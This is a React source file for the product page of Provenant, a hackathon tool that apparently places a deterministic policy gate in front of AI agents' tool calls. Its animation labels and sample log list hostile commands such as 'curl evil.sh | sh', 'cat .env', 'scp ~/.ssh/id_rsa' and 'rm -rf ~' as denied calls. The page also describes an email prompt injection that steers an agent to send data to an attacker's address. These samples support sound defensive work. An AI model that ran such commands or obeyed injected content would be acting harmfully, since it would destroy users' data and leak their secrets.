import React, { useEffect, useState } from "react";
import { createRoot } from "react-dom/client";
import { motion, MotionConfig, AnimatePresence } from "motion/react";

// The public product page. One calm scroll: what it is, how it decides, proof, install, limits.
// Every number here comes from `python evals/run_eval.py` and the unit suite at the release commit.

const GH = "https://github.com/MithunSidhaarth/provenant";
const INSTALL = {
  windows: "irm https://raw.githubusercontent.com/MithunSidhaarth/provenant/main/install.ps1 | iex",
  mac: "curl -fsSL https://raw.githubusercontent.com/MithunSidhaarth/provenant/main/install.sh | sh",
  pip: "pip install https://github.com/MithunSidhaarth/provenant/raw/main/dist/provenant_agent_shield-0.10.2-py3-none-any.whl",
};

const up = { hidden: { opacity: 0, y: 18 }, show: { opacity: 1, y: 0, transition: { duration: 0.6, ease: [0.22, 1, 0.36, 1] } } };
const Reveal = ({ as = "div", className, children, delay = 0 }) => {
  const C = motion[as];
  return <C className={className} variants={up} initial="hidden" whileInView="show" viewport={{ once: true, margin: "-80px" }}
            transition={{ delay }}>{children}</C>;
};

function Copy({ text }) {
  const [done, setDone] = useState(false);
  return (
    <button className="copy" onClick={() => { navigator.clipboard?.writeText(text).then(() => { setDone(true); setTimeout(() => setDone(false), 1400); }, () => {}); }}
            aria-label="Copy command">{done ? "Copied" : "Copy"}</button>
  );
}

function Cmd({ text, prompt = "$" }) {
  return <div className="cmd"><code><span className="pr">{prompt}</span>{text}</code><Copy text={text} /></div>;
}

// ---------------------------------------------------------------- nav
function Nav() {
  const [solid, setSolid] = useState(false);
  useEffect(() => {
    const on = () => setSolid(window.scrollY > 24);
    on(); window.addEventListener("scroll", on, { passive: true });
    return () => window.removeEventListener("scroll", on);
  }, []);
  return (
    <header className={`nav${solid ? " solid" : ""}`}>
      <a href="#top" className="brand" aria-label="Provenant home"><Mark />Provenant</a>
      <nav className="links" aria-label="Sections">
        <a href="#how">How it works</a><a href="#features">Features</a><a href="#proof">Proof</a><a href="#install">Install</a>
      </nav>
      <div className="nav-cta">
        <a className="ghost" href={GH} rel="noopener">GitHub</a>
        <a className="btn sm" href="/getting-started">Get started</a>
      </div>
    </header>
  );
}

const Mark = () => (
  <svg className="mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.5v19" /><path d="M5 7h14M5 17h14" /></svg>
);

// ---------------------------------------------------------------- hero
const FEED = [
  { tool: "read_file", arg: "src/billing.py", d: "ALLOW", why: "read-only, inside the workspace" },
  { tool: "read_email", arg: "inbox · 1 new", d: "ALLOW", why: "result scanned: injection found, session tainted" },
  { tool: "send_email", arg: "to: account-recovery@login-check.example", d: "DENY", why: "address came from the email, not from you" },
  { tool: "Bash", arg: "rm -rf ~/projects", d: "DENY", why: "recursive delete of a home path" },
  { tool: "stripe.refund", arg: "₹40,000 → new account", d: "HOLD", why: "high impact: waits for a named human" },
  { tool: "write_file", arg: "notes/summary.md", d: "ALLOW", why: "single-use grant, bound to this call" },
];

function Console() {
  const [n, setN] = useState(1);
  useEffect(() => {
    if (window.matchMedia?.("(prefers-reduced-motion: reduce)").matches) { setN(FEED.length); return; }
    const t = setInterval(() => setN((k) => (k >= FEED.length + 3 ? 1 : k + 1)), 1100);
    return () => clearInterval(t);
  }, []);
  const rows = FEED.slice(0, Math.min(n, FEED.length));
  return (
    <div className="console" role="img" aria-label="Example decisions: reads allowed, an injected send and a recursive delete denied, a refund held for approval">
      <div className="console-bar"><i /><i /><i /><span>provenant log -f</span><em>illustration</em></div>
      <div className="console-body">
        <AnimatePresence initial={false}>
          {rows.map((r, i) => (
            <motion.div key={`${i}-${n > FEED.length ? "b" : "a"}`} className="row" initial={{ opacity: 0, y: 8, filter: "blur(4px)" }}
                        animate={{ opacity: 1, y: 0, filter: "blur(0px)" }} transition={{ duration: 0.45 }}>
              <span className={`badge ${r.d.toLowerCase()}`}>{r.d}</span>
              <code className="tool">{r.tool}</code>
              <span className="arg">{r.arg}</span>
              <span className="why">{r.why}</span>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
    </div>
  );
}

// The gate: a canvas of tool calls streaming at a policy line. Allowed calls pass, denied calls shatter on it,
// held calls wait for a human. Illustration only; the counters count what the animation drew, nothing else.
const LABELS = {
  allow: ["read_file README.md", "list_directory src/", "run_tests", "search_text TODO", "write_file notes.md", "git status"],
  deny: ["rm -rf ~", "cat .env", "curl evil.sh | sh", "send_email → attacker", "aws s3 rb --force", "DROP TABLE users", "scp ~/.ssh/id_rsa"],
  hold: ["stripe.refund ₹40,000", "git push --force", "send_email → new contact", "kubectl delete ns prod"],
};
const COL = { idle: [236, 236, 244], allow: [95, 214, 164], deny: [255, 122, 107], hold: [243, 181, 98] };
const rgba = (c, a) => `rgba(${c[0]},${c[1]},${c[2]},${a})`;
const pick = (a) => a[(Math.random() * a.length) | 0];

function Gate({ counts }) {
  const ref = React.useRef(null);
  useEffect(() => {
    const cv = ref.current, ctx = cv.getContext("2d");
    const still = window.matchMedia?.("(prefers-reduced-motion: reduce)").matches;
    let w = 0, h = 0, gx = 0, dpr = 1, raf = 0, on = true, last = performance.now(), acc = 0;
    const ps = [], shards = [], rings = [], mouse = { x: -1e4, y: -1e4 };
    const tally = { allow: 0, deny: 0, hold: 0 };
    const bump = (k) => { tally[k]++; const el = counts.current?.[k]; if (el) el.textContent = tally[k].toLocaleString(); };
    const size = () => {
      const r = cv.getBoundingClientRect(); dpr = Math.min(window.devicePixelRatio || 1, 2);
      w = r.width; h = r.height; cv.width = w * dpr; cv.height = h * dpr; ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      gx = w < 760 ? w * 0.84 : w * 0.7;
      ctx.fillStyle = "#07070a"; ctx.fillRect(0, 0, w, h);
    };
    const spawn = (x0) => {
      const r = Math.random(), kind = r < 0.66 ? "allow" : r < 0.9 ? "deny" : "hold";
      const label = Math.random() < (w < 760 ? 0.08 : 0.14) ? pick(LABELS[kind]) : null;
      ps.push({ x: x0 ?? -40, y: 80 + Math.random() * (h - 120), vx: label ? 1.1 + Math.random() * 0.7 : 2.2 + Math.random() * 3.2,
                kind, label, s: label ? 0 : 1 + Math.random() * 1.6, state: "fly", t: 0 });
    };
    const shatter = (p) => {
      for (let i = 0; i < (p.label ? 26 : 12); i++) {
        const a = Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.6;
        shards.push({ x: gx - 2, y: p.y, vx: -Math.abs(Math.cos(a)) * (1 + Math.random() * 4), vy: Math.sin(a) * (Math.random() * 4) * (Math.random() < .5 ? -1 : 1), life: 1 });
      }
      rings.push({ y: p.y, r: 0, life: 1, big: !!p.label });
    };
    const pill = (p, c, a) => {
      ctx.font = "500 11px GeistMono, ui-monospace, monospace";
      const tw = ctx.measureText(p.label).width + 18, x = p.x - tw, y = p.y - 11;
      ctx.fillStyle = rgba([10, 10, 14], 0.9 * a); ctx.strokeStyle = rgba(c, 0.55 * a); ctx.lineWidth = 1;
      ctx.beginPath(); ctx.roundRect ? ctx.roundRect(x, y, tw, 22, 6) : ctx.rect(x, y, tw, 22); ctx.fill(); ctx.stroke();
      ctx.fillStyle = rgba(c, a); ctx.fillText(p.label, x + 9, p.y + 4);
    };
    const step = (dt) => {
      ctx.fillStyle = "rgba(7,7,10,0.28)"; ctx.fillRect(0, 0, w, h);
      // gate
      const g = ctx.createLinearGradient(0, 0, 0, h);
      g.addColorStop(0, "rgba(167,162,255,0)"); g.addColorStop(0.5, "rgba(167,162,255,.9)"); g.addColorStop(1, "rgba(167,162,255,0)");
      ctx.fillStyle = g; ctx.fillRect(gx - 1, 0, 2, h);
      ctx.fillStyle = "rgba(167,162,255,.035)"; ctx.fillRect(gx - 22, 0, 44, h);
      for (let i = rings.length - 1; i >= 0; i--) {
        const r = rings[i]; r.r += (r.big ? 5 : 3) * dt; r.life -= 0.022 * dt;
        if (r.life <= 0) { rings.splice(i, 1); continue; }
        ctx.strokeStyle = rgba(COL.deny, r.life * 0.8); ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.ellipse(gx, r.y, r.r * 0.35, r.r, 0, 0, Math.PI * 2); ctx.stroke();
        ctx.fillStyle = rgba(COL.deny, r.life); ctx.fillRect(gx - 1.5, r.y - r.r, 3, r.r * 2);
      }
      for (let i = ps.length - 1; i >= 0; i--) {
        const p = ps[i];
        const dy = p.y - mouse.y, dx = p.x - mouse.x, d2 = dx * dx + dy * dy;
        if (d2 < 16000 && p.state === "fly") p.y += (dy / Math.sqrt(d2 + 1)) * 2.4 * dt;
        const near = Math.max(0, Math.min(1, 1 - (gx - p.x) / 220));
        let c = COL.idle, a = 0.35 + near * 0.65;
        if (p.state === "fly") {
          p.x += p.vx * dt;
          if (near > 0) c = COL[p.kind];
          const front = p.x + (p.label ? 0 : p.s);
          if (front >= gx - 3) {
            if (p.kind === "deny") { shatter(p); bump("deny"); ps.splice(i, 1); continue; }
            if (p.kind === "hold") { p.state = "hold"; p.x = gx - 4; bump("hold"); }
            else { p.state = "pass"; bump("allow"); }
          }
        } else if (p.state === "hold") {
          p.t += dt; c = COL.hold; a = 0.55 + 0.45 * Math.sin(p.t * 0.25);
          if (p.t > 90) { p.state = Math.random() < 0.5 ? "pass" : "fade"; p.kind = p.state === "pass" ? "allow" : "hold"; }
        } else if (p.state === "pass") { p.x += p.vx * 1.2 * dt; c = COL.allow; a = Math.max(0, 1 - (p.x - gx) / (w - gx + 40)); }
        else { p.t += dt; c = COL.hold; a = Math.max(0, 1 - (p.t - 90) / 40); if (a <= 0) { ps.splice(i, 1); continue; } }
        if (p.x > w + 260) { ps.splice(i, 1); continue; }
        if (p.label) pill(p, c, a);
        else { ctx.fillStyle = rgba(c, a); ctx.fillRect(p.x - p.vx * 5, p.y - p.s / 2, p.vx * 5, p.s); ctx.fillRect(p.x, p.y - p.s, p.s * 2, p.s * 2); }
      }
      for (let i = shards.length - 1; i >= 0; i--) {
        const s = shards[i]; s.x += s.vx * dt; s.y += s.vy * dt; s.vy += 0.05 * dt; s.vx *= 0.985; s.life -= 0.018 * dt;
        if (s.life <= 0) { shards.splice(i, 1); continue; }
        ctx.fillStyle = rgba(COL.deny, s.life); ctx.fillRect(s.x, s.y, 2, 2);
      }
    };
    const loop = (now) => {
      raf = requestAnimationFrame(loop);
      if (!on) { last = now; return; }
      const dt = Math.min(3, (now - last) / 16.67); last = now;
      acc += dt * (w < 760 ? 0.35 : 0.7);
      while (acc > 1) { acc -= 1; if (ps.length < 260) spawn(); }
      step(dt);
    };
    size();
    for (let i = 0; i < 60; i++) spawn(Math.random() * gx * 0.95);
    if (still) { for (let k = 0; k < 40; k++) step(1); return; }
    raf = requestAnimationFrame(loop);
    const ro = new ResizeObserver(size); ro.observe(cv);
    const io = new IntersectionObserver(([e]) => { on = e.isIntersecting && !document.hidden; }); io.observe(cv);
    const vis = () => { on = !document.hidden; }; document.addEventListener("visibilitychange", vis);
    const mm = (e) => { const r = cv.getBoundingClientRect(); mouse.x = e.clientX - r.left; mouse.y = e.clientY - r.top; };
    const ml = () => { mouse.x = mouse.y = -1e4; };
    window.addEventListener("pointermove", mm, { passive: true }); cv.parentElement.addEventListener("pointerleave", ml);
    return () => { cancelAnimationFrame(raf); ro.disconnect(); io.disconnect(); document.removeEventListener("visibilitychange", vis);
                   window.removeEventListener("pointermove", mm); };
  }, []);
  return <canvas ref={ref} className="gate" aria-hidden="true" />;
}

// Letters rise out of a mask one by one.
const Rise = ({ text, delay = 0, className }) => (
  <span className={`line ${className || ""}`}>
    {text.split(" ").map((word, wi, all) => {
      const base = all.slice(0, wi).join(" ").length + (wi ? 1 : 0);
      return (
        <span key={wi} className="word">
          {[...word].map((ch, i) => (
            <motion.span key={i} className="ch" initial={{ y: "110%", rotate: 8, opacity: 0 }} animate={{ y: "0%", rotate: 0, opacity: 1 }}
                         transition={{ delay: delay + (base + i) * 0.028, duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>{ch}</motion.span>
          ))}
          {wi < all.length - 1 ? " " : null}
        </span>
      );
    })}
  </span>
);

// Decodes from random glyphs into the word.
function Scramble({ text, delay = 0 }) {
  const [out, setOut] = useState(text);
  useEffect(() => {
    if (window.matchMedia?.("(prefers-reduced-motion: reduce)").matches) return;
    const G = "!<>-_/[]{}=+*^?#ALLOWDENY01";
    let f = 0, t;
    const start = setTimeout(() => {
      t = setInterval(() => {
        f++; const done = Math.floor(f / 3);
        setOut([...text].map((c, i) => (i < done || c === " " ? c : G[(Math.random() * G.length) | 0])).join(""));
        if (done >= text.length) clearInterval(t);
      }, 40);
    }, delay * 1000);
    return () => { clearTimeout(start); clearInterval(t); };
  }, [text, delay]);
  return <span className="scr" aria-label={text}>{out}</span>;
}

function Hero() {
  const counts = React.useRef({});
  const set = (k) => (el) => { counts.current[k] = el; };
  return (
    <section className="hero" id="top">
      <div className="stage">
        <Gate counts={counts} />
        <div className="veil" aria-hidden="true" />
        <div className="gate-tag" aria-hidden="true"><span>POLICY GATE</span><span>deterministic · no model in the loop</span></div>
        <div className="wrap hero-inner">
          <motion.div className="eyebrow" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
            <span className="dot" />The firewall between AI agents and their tools
          </motion.div>
          <h1 aria-label="Agents propose. Policy decides.">
            <Rise text="Agents propose." delay={0.2} />
            <span className="line"><motion.span className="ch grad" initial={{ y: "110%", opacity: 0 }} animate={{ y: "0%", opacity: 1 }}
              transition={{ delay: 0.7, duration: 0.9, ease: [0.16, 1, 0.3, 1] }}>Policy <Scramble text="decides." delay={1.1} /></motion.span></span>
          </h1>
          <motion.p className="lede" initial={{ opacity: 0, y: 14 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 1.1, duration: 0.7 }}>
            Every tool call your agent makes hits one deterministic gate before it runs. Injected instructions can fool the model.
            They can't get past the gate.
          </motion.p>
          <motion.div className="hero-cta" initial={{ opacity: 0, y: 14 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 1.25, duration: 0.7 }}>
            <a className="btn" href="#install">Install in one line</a>
            <a className="btn ghost-btn" href={GH} rel="noopener">View on GitHub</a>
          </motion.div>
        </div>
        <motion.div className="hud" aria-hidden="true" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1.5 }}>
          <span><i className="allow" />ALLOW <b ref={set("allow")}>0</b></span>
          <span><i className="deny" />DENY <b ref={set("deny")}>0</b></span>
          <span><i className="hold" />HOLD <b ref={set("hold")}>0</b></span>
          <em>live illustration</em>
        </motion.div>
        <a className="scroll-cue" href="#how" aria-label="Scroll to how it works"><span /></a>
      </div>
      <div className="wrap">
        <Reveal className="hero-console"><Console /></Reveal>
      </div>
      <div className="wrap clients">
        <span>Sits in front of</span>
        <b>Claude Code</b><b>Claude Desktop</b><b>Cursor</b><b>VS Code</b><b>Windsurf</b><b>any stdio MCP server</b>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- how
const STEPS = [
  ["01", "The agent proposes", "A tool call arrives at the MCP proxy, the Claude Code hook or the gated tool server. Nothing runs yet."],
  ["02", "Policy decides", "Plain Python rules check paths, commands, destinations, secrets and where each value came from. No model in the loop."],
  ["03", "Only then it runs", "ALLOW issues a single-use grant for that exact call. DENY never reaches the tool. HOLD waits for a person."],
];

function How() {
  return (
    <section className="sec" id="how">
      <div className="wrap">
        <Reveal className="kicker">How it works</Reveal>
        <Reveal as="h2">Three steps.<br /><span className="mute">No model in the loop.</span></Reveal>
        <div className="steps">
          {STEPS.map(([n, t, p], i) => (
            <Reveal key={n} className="step" delay={i * 0.08}>
              <span className="n">{n}</span><h3>{t}</h3><p>{p}</p>
            </Reveal>
          ))}
        </div>
        <Reveal className="verdicts">
          <div><span className="badge allow">ALLOW</span><p>Runs once, under a grant bound to the call's arguments.</p></div>
          <div><span className="badge deny">DENY</span><p>Blocked with the reason. The tool is never invoked.</p></div>
          <div><span className="badge hold">REQUIRE APPROVAL</span><p>Held until a human approves in the terminal or by phone.</p></div>
        </Reveal>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- features (bento)
function Features() {
  return (
    <section className="sec" id="features">
      <div className="wrap">
        <Reveal className="kicker">Features</Reveal>
        <Reveal as="h2">Defense that doesn't<br /><span className="mute">trust the model.</span></Reveal>
        <div className="bento">
          <Reveal className="tile big">
            <h3>Provenance tracking</h3>
            <p>Provenant remembers which values came from you and which came from content the agent read. An address copied out of a phishing email can't receive your data.</p>
            <div className="flow">
              <span className="chip">email body</span><span className="arrow">→</span>
              <span className="chip warn">account-recovery@login-check.example</span><span className="arrow">→</span>
              <span className="badge deny">DENY</span>
            </div>
          </Reveal>
          <Reveal className="tile">
            <h3>Single-use grants</h3>
            <p>An approved call runs once. Change one argument and it needs a new decision. Replays are refused.</p>
          </Reveal>
          <Reveal className="tile">
            <h3>Phone approval</h3>
            <p>Risky actions and phishing emails can ring your phone. Say the code to keep or allow; silence means no.</p>
            <span className="tag">experimental</span>
          </Reveal>
          <Reveal className="tile">
            <h3>Rug-pull protection</h3>
            <p>MCP tool definitions are pinned on first use. A tool that quietly changes its description is withheld.</p>
          </Reveal>
          <Reveal className="tile">
            <h3>Tamper-evident audit</h3>
            <p>Every decision is hash-chained and signed. <code>provenant audit verify</code> points at the first edited record.</p>
          </Reveal>
          <Reveal className="tile">
            <h3>Fewer tokens</h3>
            <p>The gated tool server returns outlines and trimmed output: tool-result tokens fell 72% on our benchmark.</p>
          </Reveal>
          <Reveal className="tile wide">
            <h3>Runs on your machine</h3>
            <p>Python standard library only. No cloud account, no API key, no telemetry. Works offline; the optional phone call is the only thing that leaves the laptop.</p>
            <div className="term">
              <div><span className="pr">$</span> provenant check Bash "rm -rf ~"</div>
              <div><span className="badge deny">DENY</span> recursive delete of a home path</div>
            </div>
          </Reveal>
        </div>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- proof
const STATS = [
  ["225/225", "attacks contained", "18 categories · 168 denied, 57 held"],
  ["53/53", "legitimate actions allowed", "no false positives in the corpus"],
  ["0.15 ms", "policy decision", "median, on our test machine"],
  ["246", "automated tests", "including a real MCP server behind the proxy"],
];

function Proof() {
  return (
    <section className="sec" id="proof">
      <div className="wrap">
        <Reveal className="kicker">Proof</Reveal>
        <Reveal as="h2">Measured, <span className="mute">not promised.</span></Reveal>
        <Reveal as="p" className="sub">We red-team our own guard. Round two was written to break it, found 41 gaps, and every one is fixed. All numbers regenerate from one command.</Reveal>
        <div className="stats">
          {STATS.map(([v, l, s], i) => (
            <Reveal key={l} className="stat" delay={i * 0.06}><b>{v}</b><span>{l}</span><small>{s}</small></Reveal>
          ))}
        </div>
        <Reveal><Cmd text="python evals/run_eval.py" /></Reveal>
        <Reveal className="note">These are our own test cases: evidence for them, not a proof against every attack. <a href={`${GH}/blob/main/docs/eval/REPORT.md`} rel="noopener">Read the full report →</a></Reveal>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- install
function Install() {
  const [os, setOs] = useState("windows");
  return (
    <section className="sec" id="install">
      <div className="wrap install">
        <div>
          <Reveal className="kicker">Install</Reveal>
          <Reveal as="h2">Two minutes <span className="mute">to protected.</span></Reveal>
          <Reveal as="p" className="sub">One wheel, no dependencies, Python 3.10 or newer. Setup shows its plan and asks before changing any config.</Reveal>
          <Reveal className="ctas"><a className="btn" href="/getting-started">Guided setup</a><a className="btn ghost-btn" href={GH} rel="noopener">Source</a></Reveal>
        </div>
        <Reveal className="panel">
          <div className="tabs" role="tablist">
            {[["windows", "Windows"], ["mac", "macOS / Linux"], ["pip", "pip"]].map(([k, l]) => (
              <button key={k} role="tab" aria-selected={os === k} className={os === k ? "on" : ""} onClick={() => setOs(k)}>{l}</button>
            ))}
          </div>
          <ol className="steps-list">
            <li><span>Install</span><Cmd text={INSTALL[os]} prompt={os === "windows" ? ">" : "$"} /></li>
            <li><span>Wrap your MCP clients and the Claude Code hook</span><Cmd text="provenant setup" /></li>
            <li><span>Prove enforcement with a safe self-test</span><Cmd text="provenant verify" /></li>
            <li><span>Watch decisions live</span><Cmd text="provenant log -f" /></li>
          </ol>
        </Reveal>
      </div>
    </section>
  );
}

// ---------------------------------------------------------------- video, limits, cta, footer
function Video() {
  const [m, setM] = useState(null);
  useEffect(() => { fetch("/media/manifest.json").then((r) => (r.ok ? r.json() : null)).then(setM, () => {}); }, []);
  if (!m?.video) return null;
  return (
    <section className="sec" id="watch">
      <div className="wrap">
        <Reveal className="kicker">Watch</Reveal>
        <Reveal as="h2">See it stop an attack.</Reveal>
        <Reveal className="video"><video controls preload="none" poster={m.poster || undefined} src={m.video} /></Reveal>
      </div>
    </section>
  );
}

const LIMITS = [
  ["Shell analysis is pattern-based.", "An agent can write a script and run it later; credential files and root deletes are caught either way."],
  ["Provenance compares values.", "A paraphrased address can slip that one rule; after injected text is read, every side effect still needs a human."],
  ["Local stdio MCP only.", "Remote HTTP MCP servers are not proxied yet."],
  ["Approval needs a terminal.", "That stops an agent approving itself in most setups. It is a speed bump, not a proof."],
];

function Limits() {
  return (
    <section className="sec" id="limits">
      <div className="wrap">
        <Reveal className="kicker">Honest limits</Reveal>
        <Reveal as="h2">What it doesn't do <span className="mute">(yet).</span></Reveal>
        <div className="limits">
          {LIMITS.map(([t, p], i) => <Reveal key={t} className="limit" delay={i * 0.05}><b>{t}</b><p>{p}</p></Reveal>)}
        </div>
      </div>
    </section>
  );
}

function Final() {
  return (
    <section className="final">
      <div className="glow low" aria-hidden="true" />
      <div className="wrap">
        <Reveal as="h2">Assume the model obeys anything.<br /><span className="grad">Keep the world safe anyway.</span></Reveal>
        <Reveal className="hero-cta center"><a className="btn" href="#install">Get Provenant</a><a className="btn ghost-btn" href="/console">Open the console</a></Reveal>
      </div>
    </section>
  );
}

function Footer() {
  return (
    <footer className="foot">
      <div className="wrap foot-inner">
        <div className="brand"><Mark />Provenant</div>
        <p>Built by Team Parivartan for PARALLAX 2026, AgentShield track. A hackathon build, not an audited product.</p>
        <div className="foot-links">
          <a href={GH} rel="noopener">GitHub</a><a href="/getting-started">Get started</a><a href="/console">Console</a>
          <a href="/vendor/licenses/react-LICENSE.txt">Licences</a>
        </div>
      </div>
    </footer>
  );
}

function Site() {
  return (
    <MotionConfig reducedMotion="user">
      <Nav />
      <main><Hero /><How /><Features /><Proof /><Install /><Video /><Limits /><Final /></main>
      <Footer />
    </MotionConfig>
  );
}

createRoot(document.getElementById("root")).render(<Site />);
